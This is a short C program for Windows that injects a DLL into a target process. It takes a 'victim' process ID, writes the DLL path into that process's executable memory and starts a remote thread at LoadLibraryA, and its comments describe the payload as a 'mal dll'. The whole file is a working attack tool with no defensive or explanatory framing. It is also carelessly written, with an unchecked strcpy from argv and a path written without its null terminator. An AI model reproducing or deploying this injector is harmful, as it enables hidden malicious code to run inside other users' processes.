#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <tlhelp32.h>

// possible crt incompatibility due to gcc, try static linking during compile
int main(int argc, char* argv[]){
    char dllPath[MAX_PATH];
    strcpy(dllPath, argv[2]);

    printf("Victim PID      : %s\n", argv[1]);
    // use full or relative path
    printf("DLL to inject   : %s\n", argv[2]);

    // get Handle from proc id
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1]));
    if (hProcess == NULL) {
        printf("[---] Failed to open process %s.\n", argv[1]);
        return 1;
    }

    printf("Press Enter to attempt DLL injection.");
    getchar();

    // Allocate memory for DLL's path
    LPVOID dllPathAlloc = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if(dllPathAlloc == NULL){
        printf("[---] VirtualAllocEx unsuccessful.\n");
        getchar();
        return 1;
    }

    // Write path to memory
    BOOL pathWrote = WriteProcessMemory(hProcess, dllPathAlloc, dllPath, strlen(dllPath), NULL);
    if(!pathWrote){
        printf("[---] WriteProcessMemory unsuccessful.\n");
        getchar();
        return 1;
    }

    // returns pointer to LoadLibrary address, same in every proccess.
    LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if(loadLibraryAddress == NULL){
        printf("[---] LoadLibrary not found in process.\n");
        getchar();
        return 1;
    }

    // creates remote thread and start mal dll
    HANDLE remoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAlloc, 0, NULL);
    if(remoteThread == NULL){
        printf("[---] CreateRemoteThread unsuccessful.\n");
        getchar();
        return 1;
    }
    //Start-Address:kernel32.dll!LoadLibraryA

    CloseHandle(hProcess);
    return 0;
}